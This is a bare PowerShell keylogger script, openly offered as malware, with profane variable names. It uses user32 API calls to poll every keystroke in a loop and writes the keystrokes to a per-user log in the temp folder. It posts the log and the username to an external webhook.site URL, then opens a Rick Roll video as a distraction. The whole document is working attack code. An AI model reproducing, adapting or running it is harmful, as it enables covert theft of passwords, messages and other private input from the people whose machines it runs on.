$GetFucked = "https://webhook.site/646f82bf-b989-4b96-be90-ba140a8ead03"
  $BitchNipples = New-Item -Path $Bitch -ItemType File -Force
function Bitch($Bitch="$env:temp/$env:UserName.log") {
  $turds = Get-Content "$Bitch" | Out-String
  $Body = @{
    'username' = $env:UserName
    'content' = $turds
  }
  Invoke-RestMethod -Uri $GetFucked -Method 'post' -Body $Body
  $ciggies = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $Fucker = Add-Type -MemberDefinition $ciggies -Name 'Win32' -Namespace API -PassThru
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $shit = $Fucker::GetAsyncKeyState($ascii)
        if ($shit -eq -32767) {
          $null = [console]::CapsLock
          $when = $Fucker::MapVirtualKey($ascii, 3)
          $where = New-Object Byte[] 256
          $who = $Fucker::GetKeyboardState($where)
          $why = New-Object -TypeName System.Text.StringBuilder
          if ($Fucker::ToUnicode($ascii, $when, $where, $why, $why.Capacity, 0)) {
            [System.IO.File]::AppendAllText($Bitch, $why, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }
  finally {
    Invoke-RestMethod -Uri $GetFucked -Method 'post' -Body $Body
  }
}

Bitch
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
exit
